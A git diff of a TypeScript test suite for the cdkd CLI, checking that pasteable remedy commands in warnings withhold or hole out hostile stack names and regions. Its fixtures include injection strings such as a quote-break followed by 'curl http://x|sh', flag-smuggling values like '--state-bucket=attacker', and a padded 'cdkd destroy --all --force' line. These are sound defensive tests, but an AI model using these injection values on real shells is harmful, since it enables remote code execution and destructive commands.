@@ -8,6 +8,7 @@ import {
   buildPerStackImportNodes,
   buildResolvedParametersPerStack,
   cdkd2cfnStackName,
+  orphanWithholdWhy,
   extractChildImportParameters,
   filterTemplateForImport,
   flattenCdkdStateTreeLeafFirst,
@@ -31,6 +32,8 @@ import {
   type CdkdStateStackTree,
 } from '../../../src/cli/commands/export.js';
 import { getLogger } from '../../../src/utils/logger.js';
+import { PASTE_PAYLOADS, spansThatRun, withPasteDir } from '../utils/paste-harness.js';
+import { shellQuote } from '../../../src/utils/pasteable-command.js';
 import type { StackState } from '../../../src/types/state.js';
 import type { S3StateBackend } from '../../../src/state/s3-state-backend.js';
 import type { AwsClients } from '../../../src/utils/aws-clients.js';
@@ -2333,6 +2336,119 @@ describe('reportDriftBaselineGaps', () => {
     return { warn: vi.fn(), info: vi.fn(), debug: vi.fn(), error: vi.fn(), setLevel: vi.fn() };
   }
 
+  it('pastes nothing runnable at any granularity, through the reporter itself', () => {
+    // The paste fence for THIS site's two commands (`cdkd state show` and
+    // `cdkd state refresh-observed`, both built through the shared gate since
+    // go-to-k/cdkd#3436's fold-in): every warning the reporter emits for an
+    // ordinary name is inert in every span, and for each payload family as
+    // the stack name and as the region the per-block criterion holds
+    // (`tests/unit/utils/paste-harness.ts`).
+    // Two shapes of state, because the two commands render on DIFFERENT
+    // arms: a readable resource missing its baseline reaches the
+    // `refresh-observed` line, and an UNREADABLE entry reaches the `state
+    // show` one — and with an unreadable entry present the refresh line is
+    // withheld in favour of "repair first" prose. Without the second shape
+    // `unreadableCount` is zero and that command's builder is never reached.
+    const render = (stackName: string, region: string, unreadable: boolean): string[] => {
+      const logger = makeLogger();
+      reportDriftBaselineGaps(
+        {
+          version: 3,
+          stackName,
+          region,
+          resources: {
+            R1: { physicalId: 'p', resourceType: 'AWS::S3::Bucket', properties: {} },
+            ...(unreadable && {
+              Bad: null as unknown as import('../../../src/types/state.js').ResourceState,
+            }),
+          },
+          outputs: {},
+          lastModified: 0,
+        },
+        logger as unknown as ReturnType<typeof import('../../../src/utils/logger.js').getLogger>
+      );
+      const warned = logger.warn.mock.calls.map((c) => String(c[0]));
+      expect(warned.length, `${stackName} / ${region}`).toBeGreaterThan(0);
+      return warned;
+    };
+    withPasteDir((dir) => {
+      const refresh = render('S', 'us-east-1', false);
+      expect(refresh.join('\n')).toContain('cdkd state refresh-observed S --stack-region us-east-1');
+      const inspect = render('S', 'us-east-1', true);
+      expect(inspect.join('\n')).toContain('cdkd state show S --stack-region us-east-1 --json');
+      for (const message of [...refresh, ...inspect]) expect(spansThatRun(message, dir)).toEqual([]);
+      // The region keeps its 128 display cap through the gate (`maxCodePoints`):
+      // one over it is a hole in the inspect command, at it is named.
+      const capped = render('S', 'r'.repeat(129), true).join('\n');
+      expect(capped).toContain("cdkd state show S --stack-region '<region>' --json");
+      expect(capped).not.toContain('r'.repeat(129));
+      expect(render('S', 'r'.repeat(128), true).join('\n')).toContain(
+        `cdkd state show S --stack-region ${'r'.repeat(128)} --json`
+      );
+      // Inert at every granularity for every payload too: this report never
+      // displays the name or region in prose, so the stronger contract holds
+      // and is what is pinned.
+      for (const { value } of PASTE_PAYLOADS) {
+        for (const unreadable of [false, true]) {
+          for (const message of render(value, 'us-east-1', unreadable)) {
+            expect(spansThatRun(message, dir), value).toEqual([]);
+          }
+          for (const message of render('S', value, unreadable)) {
+            expect(spansThatRun(message, dir), value).toEqual([]);
+          }
+        }
+      }
+      // A REGION beginning with `-` (read raw off the state body): the WRITE
+      // command is withheld with the sentence naming the region, never printed
+      // with an unexplained `'<region>'` hole (code review); the READ line
+      // keeps its hole and says what it stands for.
+      // A bare `-` too: the guard is the LEADING dash, not a dash plus more.
+      for (const region of ['--all', '-x', '-']) {
+        const optionRegion = render('S', region, false).join('\n');
+        // The BUILT command is absent (the prose-quoted static
+        // `'cdkd state refresh-observed'` in the withheld sentence is not it).
+        expect(optionRegion, region).not.toMatch(/cdkd state refresh-observed S/);
+        expect(optionRegion, region).not.toContain("'<region>'");
+        // The sentence names the VALUE the gate refused, rendered from its
+        // reason (M3 of the go-to-k/cdkd#3764 review).
+        expect(optionRegion, region).toContain(
+          "this stack's region starts with '-', which cdkd refuses rather than risk"
+        );
+      }
+      // The READ line keeps its hole and explains it BEFORE the command, so
+      // the command stays last and pasteable -- for an option-shaped region
+      // and for a capped one alike (the explanation keys on `inspect.exact`,
+      // not on one spelling).
+      for (const region of ['--all', 'r'.repeat(129)]) {
+        const line = render('S', region, true).find((m) => m.includes('Inspect it with:'))!;
+        expect(line, region).toMatch(
+          /hole in the command at the end of this line stands for [^\n]*Inspect it with: cdkd state show S --stack-region '<region>' --json$/
+        );
+      }
+      // ...and for a withheld STACK NAME with an ordinary region, so the
+      // explanation keys on any hole, not on the region's alone.
+      const stackHole = render('--all', 'us-east-1', true).find((m) => m.includes('Inspect it with:'))!;
+      expect(stackHole).toMatch(
+        /hole in the command at the end of this line stands for [^\n]*Inspect it with: cdkd state show '<stack>' --stack-region us-east-1 --json$/
+      );
+      // The listing it points at is the RAW one: `--long` trims through
+      // `displayIdent`, so it would hand back the spelling the gate refused
+      // (go-to-k/cdkd#3420).
+      expect(stackHole).toContain(
+        "fill it from 'cdkd state list --json', replacing the hole, quotes included, with the shell-quoted value."
+      );
+      expect(stackHole).not.toContain('--long');
+      // ...and for a NON-PLAIN stack name, which `plainIdent` holes where
+      // exactness alone would have named it shell-quoted (M2 of the
+      // go-to-k/cdkd#3764 review).
+      const plainHole = render("It's Stack", 'us-east-1', true).find((m) => m.includes('Inspect it with:'))!;
+      expect(plainHole).toMatch(
+        /hole in the command at the end of this line stands for [^\n]*Inspect it with: cdkd state show '<stack>' --stack-region us-east-1 --json$/
+      );
+      expect(render('S', 'us-east-1', true).join('\n')).not.toContain('hole in the command at the end of this line');
+    });
+  }, 120_000);
+
   it('warns nothing when every resource has observedProperties', () => {
     const logger = makeLogger();
     reportDriftBaselineGaps(
@@ -2627,7 +2743,7 @@ describe('reportDriftBaselineGaps', () => {
     expect(logger.warn).not.toHaveBeenCalled();
   });
 
-  it('sanitizes, caps and shell-quotes the REGION in every command it builds', () => {
+  it('holes the REGION in the read command and withholds the write on it, never a sanitized spelling', () => {
     // The stack name has hostile, oversized and blank fixtures at every
     // position; the region did not, so the raw value, the stack's cap or an
     // unquoted region at this call site all left those cases green. Driven
@@ -2650,10 +2766,24 @@ describe('reportDriftBaselineGaps', () => {
         .find((m) => m.includes('--stack-region'));
       expect(command).toBeDefined();
       expect(command).not.toContain(String.fromCharCode(0x1b));
-      // Shell-quoted, the embedded quote escaped, and cut at a region's 128.
-      // `us`, the escape as a space, ` east'1`: ten code points, so 118 `R`s.
-      expect(command).toContain(String.raw`--stack-region 'us  east'\''1` + 'R'.repeat(118) + `...'`);
-      expect((command!.match(/R{3,}/g) ?? []).every((run) => run.length === 118)).toBe(true);
+      // A HOLE, not a sanitized spelling, since go-to-k/cdkd#3436's fold-in.
+      // The site used to print `shellQuote(safeRegion(region))` -- the altered
+      // value, cut at 128 -- which is the "never the altered spelling"
+      // half of the rule the shared gate enforces: a region rendering CHANGED
+      // addresses a different record than the message means. The escape and
+      // the over-cap length each make this value inexact on their own, and
+      // the quote alone would be refused by `plainIdent` as `not-plain`, so it
+      // is withheld on three counts rather than respelled.
+      // Scoped to the COMMAND, not the whole message: the prose still DISPLAYS
+      // the sanitized region beside it, which is go-to-k/cdkd#3232's class and
+      // not this one. What must never carry an altered spelling is the text an
+      // operator pastes.
+      const commandSpan = command!.slice(command!.indexOf('cdkd state show'));
+      expect(commandSpan).toContain(`--stack-region '<region>'`);
+      expect(commandSpan, 'an altered spelling must never be NAMED in a command').not.toMatch(
+        /R{3,}/
+      );
+      expect(commandSpan).not.toContain('us  east');
     }
 
     const refresh = makeLogger();
@@ -2735,6 +2865,26 @@ describe('reportDriftBaselineGaps', () => {
     expect(text).toContain('cdkd state show App --json');
     expect(text).not.toContain('--stack-region');
     expect(text).not.toContain('eu-west-1');
+    // ...and the region-less arm of the read command still holds the stack
+    // to `plainIdent`: a loaded name that renders exactly but is not plain is
+    // a hole there too (the arm is a separate argument list from the
+    // region-carrying one, so it needs its own pin).
+    const holed = makeLogger();
+    reportDriftBaselineGaps(
+      {
+        version: 10,
+        stackName: 'Other',
+        region: 'eu-west-1',
+        resources: { BrokenRow: null as never },
+        outputs: {},
+        lastModified: 0,
+      },
+      holed as unknown as ReturnType<typeof import('../../../src/utils/logger.js').getLogger>,
+      { stackName: "It's Stack", region: loadedRegion }
+    );
+    const holedText = holed.warn.mock.calls.map((c) => String(c[0])).join('\n');
+    expect(holedText).toContain("cdkd state show '<stack>' --json");
+    expect(holedText).not.toContain("Stack' --json");
   });
   }
 
@@ -2829,7 +2979,7 @@ describe('reportDriftBaselineGaps', () => {
     expect(refreshAdvice).toContain('refuses a record that holds one');
   });
 
-  it('sanitizes and caps the identifiers it prints, and shell-quotes the stack in its command', () => {
+  it('sanitizes and caps the identifiers it prints, and holes a non-plain stack name in its command', () => {
     // Every identifier in this report comes out of the record: the logical ids
     // from the stored bag, `stackName` from the record body or the S3 key.
     // `ConsoleLogger` sanitizes a logger's extra ARGUMENTS, never the message
@@ -2885,26 +3035,27 @@ describe('reportDriftBaselineGaps', () => {
     // An id with nothing renderable left becomes the named stand-in rather than
     // an empty bullet naming nothing.
     expect(all).toContain('<unrenderable>');
-    // The stack name is SHELL-QUOTED where it lands inside a command: the
-    // ASCII allowlist keeps `\'`, `;` and `|`, so unquoted it would close the
-    // quoting and append its own command to the line.
+    // The stack name is a HOLE where it lands inside a command: the ASCII
+    // allowlist keeps `\'`, `;` and `|`, so it renders exactly, and
+    // `plainIdent` is what refuses it (M2 of the go-to-k/cdkd#3764 review) —
+    // a shell-quoted spelling is what an operator strips, and a padded one
+    // can spell a labelled line once the terminal wraps. The clause before
+    // the command says what the hole stands for, and the name itself appears
+    // nowhere in the report.
     const inspect = logger.warn.mock.calls
       .map((c) => String(c[0]))
       .find((m) => m.includes('cdkd state show'));
     expect(inspect).toBeDefined();
-    // Spelled out rather than built by calling `shellQuote`, so the expected
-    // value is independent of the code under test: `shellQuote` escapes an
-    // embedded quote as `'\''`, closing the literal, emitting an escaped quote
-    // and reopening.
+    expect(inspect).toContain("A quoted '<...>' hole in the command at the end of this line stands for");
+    expect(inspect).not.toContain('curl');
     // The command must be the WHOLE tail after `Inspect it with: ` — LAST and
     // UNWRAPPED, the contract `lock-contention-message.ts` states. A
     // `toContain` survives both mutants that break it: prose appended after
-    // `--json`, and the whole command wrapped in quotes (which composes with
-    // `shellQuote`'s own quoting into something unpastable).
+    // `--json`, and the whole command wrapped in quotes.
     const MARKER = 'Inspect it with: ';
     expect(inspect).toContain(MARKER);
     expect(inspect!.slice(inspect!.indexOf(MARKER) + MARKER.length)).toBe(
-      String.raw`cdkd state show 'Evil'\''; curl http://x|sh; echo '\''' --stack-region r --json`
+      "cdkd state show '<stack>' --stack-region r --json"
     );
   });
 
@@ -3137,40 +3288,84 @@ describe('reportDriftBaselineGaps', () => {
       // sentence beside it names. A prebuilt cloud assembly supplies this name
       // unvalidated, so it is reachable.
       for (const [label, stackName, printed] of [
-        ['the flag itself', '--all', false],
-        ['a single leading hyphen', '-x', false],
+        ['the flag itself', '--all', 'option'],
+        ['a single leading hyphen', '-x', 'option'],
         // Only the LEADING-hyphen half of `cdkd deploy`'s sibling gate applies
         // here, and these three rows are what stops that gate being copied
         // whole: `cdkd state refresh-observed` resolves its argument by exact
         // name equality (`r.stackName === stackName`), so a `*` or a `/`
         // selects at most the one record literally named that and cannot widen
-        // the target the way a pattern does — withholding for one would cost a
-        // working command and buy nothing.
-        ['a wildcard after a prefix', 'Prod-*', true],
-        ['a display path', 'App/Stack', true],
-        ['an inner hyphen', 'My-App-Stack', true],
+        // the target the way a pattern does. Both ARE withheld — by the
+        // plain-identifier rule, since neither character is one — and the
+        // sentence says so; what is pinned is that it is NOT the pattern
+        // sentence, i.e. `patternMatched` stays unpassed.
+        ['a wildcard after a prefix', 'Prod-*', 'not-plain'],
+        ['a display path', 'App/Stack', 'not-plain'],
+        ['an inner hyphen', 'My-App-Stack', 'printed'],
       ] as const) {
         const advice = refreshAdviceFor(version, stackName, 'us-east-1');
-        if (printed) {
+        if (printed === 'printed') {
           expect(advice, label).toContain('cdkd state refresh-observed');
           expect(advice, label).not.toContain('The command is not printed');
         } else {
           expect(advice, label).not.toMatch(/cdkd state refresh-observed \S/);
           // The withheld sentence names THIS cause. The exactness wording
           // would be false here — the name renders exactly.
-          expect(advice, label).toContain("reads as an option however it is quoted");
           expect(advice, label).not.toContain('cannot be rendered exactly');
+          expect(advice, label).not.toContain('pattern character');
+          expect(advice, label).toContain(
+            printed === 'option'
+              ? "this stack's name starts with '-', which cdkd refuses rather than risk the CLI reading it as an option however it is quoted"
+              : "this stack's name is not a plain identifier"
+          );
         }
       }
     });
 
     it(`v${version}: WITHHOLDS the refresh command when rendering altered the region`, () => {
-      // A non-breaking space, and a cut at the region cap.
-      for (const region of [`us-east-1\u00a0`, 'r'.repeat(200)]) {
+      // A non-breaking space, and a cut at the region cap (one over it: the
+      // gate's `maxCodePoints`, which is what the sentence must be keyed on —
+      // M3 of the go-to-k/cdkd#3764 review — rather than printing
+      // `--stack-region '<region>'` with no sentence).
+      for (const region of [`us-east-1\u00a0`, 'r'.repeat(129), 'r'.repeat(200)]) {
         const advice = refreshAdviceFor(version, 'S', region);
         expect(advice, region.slice(0, 12)).not.toMatch(/cdkd state refresh-observed \S/);
-        expect(advice, region.slice(0, 12)).toContain('The command is not printed');
+        expect(advice, region.slice(0, 12)).not.toContain("'<region>'");
+        expect(advice, region.slice(0, 12)).toContain(
+          "The command is not printed: this stack's region as cdkd loaded it cannot be rendered exactly"
+        );
       }
+    });
+
+    it(`v${version}: WITHHOLDS the refresh command when a value is not a PLAIN identifier`, () => {
+      // `plainIdent` on both values (M2 of the go-to-k/cdkd#3764 review): each
+      // of these renders exactly and starts with no `-`, so exactness and the
+      // option arm admit it and only the plain-identifier rule withholds — a
+      // padded name spells a labelled line once the terminal wraps, and a
+      // shell-quoted one is what an operator strips.
+      const padded = `Prod${' '.repeat(60)}Migrate with: cdkd destroy --all --force #`;
+      for (const [label, stackName, region, what] of [
+        ['a padded stack name', padded, 'us-east-1', "this stack's name"],
+        ['a stack name with a quote', "It's Stack", 'us-east-1', "this stack's name"],
+        ['a region with a space', 'S', 'us east', "this stack's region"],
+      ] as const) {
+        const advice = refreshAdviceFor(version, stackName, region);
+        expect(advice, label).not.toMatch(/cdkd state refresh-observed \S/);
+        expect(advice, label).not.toContain("'<region>'");
+        expect(advice, label).not.toContain("'<stack>'");
+        expect(advice, label).toContain(
+          `The command is not printed: ${what} is not a plain identifier (a letter or digit, then letters, digits, '~', '_', '.' or '-')`
+        );
+        expect(advice, label).not.toContain('cannot be rendered exactly');
+        expect(advice, label).not.toContain("starts with '-'");
+      }
+      // BOTH values refused, for different reasons: the sentence is about the
+      // FIRST the gate refused — the stack name, in the gate's own order — so
+      // it names the name's option shape, not the region's plainness.
+      const both = refreshAdviceFor(version, '--all', 'us east');
+      expect(both).not.toMatch(/cdkd state refresh-observed \S/);
+      expect(both).toContain("The command is not printed: this stack's name starts with '-'");
+      expect(both).not.toContain("this stack's region");
     });
 
     // The gate measured against what production passes: the LOADED identity.
@@ -3222,7 +3417,7 @@ describe('reportDriftBaselineGaps', () => {
         region: 'us-east-1',
       });
       expect(optionWithheld).not.toMatch(/cdkd state refresh-observed \S/);
-      expect(optionWithheld).toContain('reads as an option however it is quoted');
+      expect(optionWithheld).toContain('refuses rather than risk the CLI reading it as an option however it is quoted');
       // Body `--all`, clean loaded identity: PRINTED, since the body is not
       // what the command is built from.
       expect(refreshAdviceLoaded({ stackName: '--all', region: 'us-east-1' }, clean)).toContain(
@@ -3390,15 +3585,29 @@ describe('reportDriftBaselineGaps', () => {
     // nested name needs — capping it at an identifier's 128 emitted a remedy
     // command naming a stack that does not exist.
     const long = inspectLineFor('q'.repeat(5000));
-    expect(long).toContain(`${'q'.repeat(1152)}...`);
-    expect(long).not.toContain('q'.repeat(1153));
+    // The whole of this line IS the command -- it carries no prose display of
+    // the name beside it -- so the over-cap name is withheld outright since
+    // go-to-k/cdkd#3436's fold-in rather than printed truncated. That is a
+    // BEHAVIOUR CHANGE and the better one: `q...q...` cut at 1152 addresses a
+    // different record than the message means, which is the harm the cap's own
+    // note describes one step further on. The cap still governs what the PROSE
+    // may display elsewhere; it is no longer a licence to name a cut value in
+    // something the operator pastes.
+    expect(long).toContain(`cdkd state show '<stack>'`);
+    expect(long, 'a truncated name must never be NAMED in a command').not.toMatch(/q{10,}/);
     // The remedy is still on screen after the cap — a DISTANCE, sized to the
     // wider identifier rather than to the old one.
     expect(long!.length).toBeLessThan(1600);
 
-    // Nothing renderable left becomes the named stand-in rather than an empty
-    // argument, which `cdkd state show` would read as no stack at all.
-    expect(inspectLineFor('\u0000\u0001')).toContain('<unrenderable>');
+    // Nothing renderable left becomes a quoted HOLE rather than an empty
+    // argument, which `cdkd state show` would read as no stack at all. It was
+    // `<unrenderable>` before go-to-k/cdkd#3436's fold-in; both are quoted
+    // stand-ins that close the empty-argument hazard, and the hole additionally
+    // says WHICH argument is missing so the operator can fill it.
+    expect(inspectLineFor('\u0000\u0001')).toContain(`cdkd state show '<stack>'`);
+    expect(inspectLineFor('\u0000\u0001'), 'never an empty argument').not.toMatch(
+      /cdkd state show\s+--/
+    );
   });
 
   it('stands in for an id or stack name with nothing renderable, at every position', () => {
@@ -3749,9 +3958,35 @@ describe('buildCdkdStateStackTree (issue #464 PR B1)', () => {
       'a shell metacharacter',
       "A'; curl http://x|sh; echo '",
       (m: string) => {
-        // SHELL-QUOTED, so the pasteable line cannot break out of its argument.
-        expect(m).not.toMatch(/cdkd state orphan [^'\n]*;/);
-        expect(m).toContain("cdkd state orphan 'Root~A'\\''; curl http://x|sh; echo '\\'''");
+        // WITHHELD as not a plain identifier (go-to-k/cdkd#3997): the command
+        // names neither value, so no metacharacter reaches the pasteable line.
+        expect(m).not.toMatch(/cdkd state orphan [^\n]*curl/);
+        expect(m).toContain(
+          "its record's stack name is not a plain identifier (a letter or digit, then letters, " +
+            "digits, '~', '_', '.' or '-'), which cdkd does not print on a command line."
+        );
+        expect(m.endsWith("Drop it with: cdkd state orphan '<stack>' --stack-region '<region>'")).toBe(
+          true
+        );
+      },
+    ],
+    [
+      // The shape go-to-k/cdkd#3997 names: a name padded so a terminal wraps
+      // part of it onto what reads as its own `…with: cdkd …` line. It renders
+      // EXACTLY (medial spaces survive `displaySafe`), so only the
+      // plain-identifier rule withholds it.
+      'medial padding spelling a second command line',
+      `A${' '.repeat(80)}Drop it with: cdkd state orphan X`,
+      (m: string) => {
+        // The command line carries holes, not the padded name. (The prose head
+        // above still names it: the value-in-prose shape, tracked apart.)
+        expect(m.split('\n').at(-1)).toBe(
+          "Drop it with: cdkd state orphan '<stack>' --stack-region '<region>'"
+        );
+        expect(m).toContain("its record's stack name is not a plain identifier");
+        expect(m.endsWith("Drop it with: cdkd state orphan '<stack>' --stack-region '<region>'")).toBe(
+          true
+        );
       },
     ],
     [
@@ -3761,8 +3996,24 @@ describe('buildCdkdStateStackTree (issue #464 PR B1)', () => {
         // WITHHELD: `displaySafe` trims, so `Root~A ` renders as `Root~A` and a
         // substituted command would delete the intact record of that name.
         expect(m).toContain("cdkd state orphan '<stack>' --stack-region '<region>'");
-        expect(m).toContain('cdkd state list --long');
+        // `--json`, not `--long`: the long listing renders through
+        // `displayIdent`, which trims, so it hands back the very spelling this
+        // arm refused (go-to-k/cdkd#3420).
+        expect(m).toContain('cdkd state list --json');
+        expect(m).not.toContain('--long');
+        expect(m).toContain('replacing each quoted hole, quotes included, with the shell-quoted value');
+        // `state list --json` prints {stackName, region}, not a key.
+        expect(m).toContain('act on the one whose stackName and region match');
         expect(m).not.toMatch(/cdkd state orphan 'Root~A'/);
+        // The reason is the GATE's, for the value it withheld, and the note
+        // sits BEFORE the command, which ends the message (go-to-k/cdkd#3436).
+        expect(m).toContain(
+          "The next line's command names neither value, because its record's stack name does " +
+            'NOT render exactly (another record may render identically).'
+        );
+        expect(m.endsWith("Drop it with: cdkd state orphan '<stack>' --stack-region '<region>'")).toBe(
+          true
+        );
       },
     ],
     [
@@ -3816,12 +4067,14 @@ describe('buildCdkdStateStackTree (issue #464 PR B1)', () => {
     ['the STACK NAME', '--state-bucket=attacker', 'us-east-1'],
     ['the REGION', 'Root', '--state-bucket=attacker'],
   ])(
-    'withholds the orphan command when %s would be read as a flag (go-to-k/cdkd#3499 M8)',
+    'withholds the orphan command when %s begins with a - (go-to-k/cdkd#3499 M8)',
     async (_, rootName, region) => {
-      // The value renders EXACTLY, so the raw compare admits it — and the
-      // shell strips the quotes `shellQuote` adds, handing Commander that argv
-      // entry as the FLAG. A record-DELETING command would then be pointed at
-      // an attacker-named bucket. The cases drive the ROOT name and the region
+      // The value renders EXACTLY, so the raw compare admits it. As the STACK
+      // NAME, the shell strips the quotes `shellQuote` adds and Commander reads
+      // the positional as the FLAG, pointing a record-DELETING command at an
+      // attacker-named bucket. As the REGION it is `--stack-region`'s value,
+      // which Commander takes as given (measured); the gate refuses it
+      // conservatively all the same. The cases drive the ROOT name and the region
       // because this site passes the PARENT's `stackName` to the builder, not
       // the child's — not because a derived name cannot start with `-`, which
       // it can when its own root does (m16 of the go-to-k/cdkd#3499 review).
@@ -3840,8 +4093,249 @@ describe('buildCdkdStateStackTree (issue #464 PR B1)', () => {
       expect(message).toContain('missing nested-child');
       expect(message).toContain("cdkd state orphan '<stack>' --stack-region '<region>'");
       expect(message).not.toMatch(/cdkd state orphan [^\n]*--state-bucket=attacker/);
+      // The note names the value the gate withheld and its reason, and only
+      // that one: a note keyed on a predicate of its own would name both.
+      const isRegion = rootName === 'Root';
+      const named = isRegion ? 'region' : 'stack name';
+      const other = isRegion ? 'stack name' : 'region';
+      // Only the POSITIONAL parses as a flag; Commander takes the word after
+      // `--stack-region` as its value, so the region's sentence claims less.
+      const why = isRegion
+        ? "begins with a '-', which cdkd refuses to print as an argument"
+        : "begins with a '-', which 'cdkd state orphan' could parse as a flag";
+      expect(message).toContain(
+        `The next line's command names neither value, because its record's ${named} ${why}.`
+      );
+      expect(message).not.toContain(`record's ${other}`);
+      expect(message).not.toContain(`its ${other}`);
+      // Never "fill the hole" for a STACK NAME: `'--all'` parses as the option
+      // in the positional whatever the quoting, so that instruction would
+      // rebuild the command. The region's hole is a flag value, safe to fill.
+      const noFill =
+        'repair or remove the one whose stackName and region match by hand — this stack name ' +
+        "begins with a '-' and could parse as an option in that position, so do not fill a " +
+        'hole with it.';
+      if (isRegion) {
+        expect(message).not.toContain(noFill);
+        expect(message).toContain('replacing each quoted hole');
+      } else {
+        expect(message).toContain(noFill);
+        expect(message).not.toContain('replacing each quoted hole');
+      }
+      expect(message.endsWith("cdkd state orphan '<stack>' --stack-region '<region>'")).toBe(true);
     }
   );
+
+  it('withholds a REGION that renders exactly but is not a plain identifier, naming only it (go-to-k/cdkd#3997)', async () => {
+    const region = 'us-east-1 x';
+    const root = makeState({
+      stackName: 'Root',
+      region,
+      resources: { Child: { resourceType: 'AWS::CloudFormation::Stack' } },
+    });
+    const backend = makeStateBackendMock({ [`Root|${region}`]: root }) as S3StateBackend;
+    const message = (
+      (await buildCdkdStateStackTree('Root', region, backend).catch((e: unknown) => e)) as Error
+    ).message;
+    expect(message).toContain(
+      "The next line's command names neither value, because its record's region is not a plain " +
+        "identifier (a letter or digit, then letters, digits, '~', '_', '.' or '-'), which cdkd " +
+        'does not print on a command line.'
+    );
+    // Only the region: the stack name is plain and is not blamed.
+    expect(message).not.toContain('stack name is not a plain identifier');
+    // A region is a flag's value, so its hole may be filled.
+    expect(message).toContain('replacing each quoted hole');
+    expect(message.endsWith("cdkd state orphan '<stack>' --stack-region '<region>'")).toBe(true);
+  });
+
+  it.each([
+    ['stack name', 'q'.repeat(STACK_REF_MAX_CODE_POINTS + 1), 'us-east-1', 'is too long to print'],
+    ['region', 'Root', '', 'is empty'],
+  ])(
+    "renders the gate's reason for a withheld %s (go-to-k/cdkd#3436)",
+    async (what, rootName, region, why) => {
+      const root = makeState({
+        stackName: rootName,
+        region,
+        resources: { Child: { resourceType: 'AWS::CloudFormation::Stack' } },
+      });
+      const backend = makeStateBackendMock({ [`${rootName}|${region}`]: root }) as S3StateBackend;
+
+      const thrown = await buildCdkdStateStackTree(rootName, region, backend).catch(
+        (e: unknown) => e
+      );
+
+      const message = (thrown as Error).message;
+      expect(message).toContain(
+        `The next line's command names neither value, because its record's ${what} ${why}.`
+      );
+      expect(message.endsWith("cdkd state orphan '<stack>' --stack-region '<region>'")).toBe(true);
+    }
+  );
+
+  it('never says to fill the stack hole with a name beginning with -, whatever reason withheld it (go-to-k/cdkd#3436)', async () => {
+    // The gate reports `too-long` before `option-shaped`, so the recovery
+    // instruction cannot be keyed on the reason alone.
+    const rootName = `--${'x'.repeat(STACK_REF_MAX_CODE_POINTS)}`;
+    const root = makeState({
+      stackName: rootName,
+      region: 'us-east-1',
+      resources: { Child: { resourceType: 'AWS::CloudFormation::Stack' } },
+    });
+    const backend = makeStateBackendMock({ [`${rootName}|us-east-1`]: root }) as S3StateBackend;
+
+    const thrown = await buildCdkdStateStackTree(rootName, 'us-east-1', backend).catch(
+      (e: unknown) => e
+    );
+
+    const message = (thrown as Error).message;
+    // And when the gate calls it ALTERED first (a zero-width space).
+    const alteredName = '--all\u200b';
+    const altered = makeState({
+      stackName: alteredName,
+      region: 'us-east-1',
+      resources: { Child: { resourceType: 'AWS::CloudFormation::Stack' } },
+    });
+    const alteredThrown = await buildCdkdStateStackTree(
+      alteredName,
+      'us-east-1',
+      makeStateBackendMock({ [`${alteredName}|us-east-1`]: altered }) as S3StateBackend
+    ).catch((e: unknown) => e);
+    expect((alteredThrown as Error).message).toContain("its record's stack name does NOT render exactly");
+    expect((alteredThrown as Error).message).toContain('so do not fill a hole with it.');
+    expect((alteredThrown as Error).message).not.toContain('replacing each quoted hole');
+    expect(message).toContain("its record's stack name is too long to print.");
+    // The tail says WHY the no-fill rule applies, since the reason above is
+    // the cap, not the dash (m3 of the go-to-k/cdkd#3924 review).
+    expect(message).toContain(
+      "this stack name begins with a '-' and could parse as an option in that position, so do " +
+        'not fill a hole with it.'
+    );
+    expect(message).not.toContain('replacing each quoted hole');
+  });
+
+  it('names a stack name AT the cap, so the too-long refusal is the cap and not a shorter bound', async () => {
+    const rootName = 'q'.repeat(STACK_REF_MAX_CODE_POINTS);
+    const root = makeState({
+      stackName: rootName,
+      region: 'us-east-1',
+      resources: { Child: { resourceType: 'AWS::CloudFormation::Stack' } },
+    });
+    const backend = makeStateBackendMock({ [`${rootName}|us-east-1`]: root }) as S3StateBackend;
+
+    const thrown = await buildCdkdStateStackTree(rootName, 'us-east-1', backend).catch(
+      (e: unknown) => e
+    );
+
+    expect(
+      (thrown as Error).message.endsWith(
+        `\nDrop it with: cdkd state orphan ${rootName} --stack-region us-east-1`
+      )
+    ).toBe(true);
+  });
+
+  it('answers the reason orphanCommandFor cannot reach with a true sentence, not a throw (go-to-k/cdkd#3924 m2)', () => {
+    // A throw would escape the state-deletion warn's `catch` (M4's hazard).
+    // `not-plain` IS reachable since go-to-k/cdkd#3997 and has its own sentence.
+    for (const positional of [true, false]) {
+      expect(orphanWithholdWhy('pattern-shaped', positional)).toBe(
+        "cannot be printed as an argument to 'cdkd state orphan'"
+      );
+      expect(orphanWithholdWhy('not-plain', positional)).toBe(
+        "is not a plain identifier (a letter or digit, then letters, digits, '~', '_', '.' or '-'), which " +
+          'cdkd does not print on a command line'
+      );
+    }
+  });
+
+  it('fails CLOSED on a non-string stack name instead of throwing (go-to-k/cdkd#3924 M4)', async () => {
+    // `unknown` in, handed to the gate unconverted: a non-string is withheld,
+    // and the leading-`-` check must not call `.startsWith` on it.
+    const rootName = 123 as unknown as string;
+    const root = makeState({
+      stackName: rootName,
+      region: 'us-east-1',
+      resources: { Child: { resourceType: 'AWS::CloudFormation::Stack' } },
+    });
+    const backend = makeStateBackendMock({ '123|us-east-1': root }) as S3StateBackend;
+
+    const thrown = await buildCdkdStateStackTree(rootName, 'us-east-1', backend).catch(
+      (e: unknown) => e
+    );
+
+    const message = (thrown as Error).message;
+    expect(thrown).not.toBeInstanceOf(TypeError);
+    expect(message).toContain("because its record's stack name is not a string.");
+    expect(message.endsWith("\nDrop it with: cdkd state orphan '<stack>' --stack-region '<region>'")).toBe(
+      true
+    );
+  });
+
+  it('names BOTH withheld values in one note when both are refused (go-to-k/cdkd#3436)', async () => {
+    const rootName = '--all';
+    const region = 'us-east-1\u200b';
+    const root = makeState({
+      stackName: rootName,
+      region,
+      resources: { Child: { resourceType: 'AWS::CloudFormation::Stack' } },
+    });
+    const backend = makeStateBackendMock({ [`${rootName}|${region}`]: root }) as S3StateBackend;
+
+    const thrown = await buildCdkdStateStackTree(rootName, region, backend).catch(
+      (e: unknown) => e
+    );
+
+    expect((thrown as Error).message).toContain(
+      "The next line's command names neither value, because its record's stack name begins " +
+        "with a '-', which 'cdkd state orphan' could parse as a flag; and its region does NOT " +
+        'render exactly (another record may render identically).'
+    );
+  });
+
+  it("pastes nothing runnable from the nested-child refusal's remedy sentence and command, named or withheld (go-to-k/cdkd#3436)", async () => {
+    const messages: string[] = [];
+    for (const { value } of PASTE_PAYLOADS) {
+      for (const rootName of [value, `-${value}`]) {
+        const root = makeState({
+          stackName: rootName,
+          region: 'us-east-1',
+          resources: { Child: { resourceType: 'AWS::CloudFormation::Stack' } },
+        });
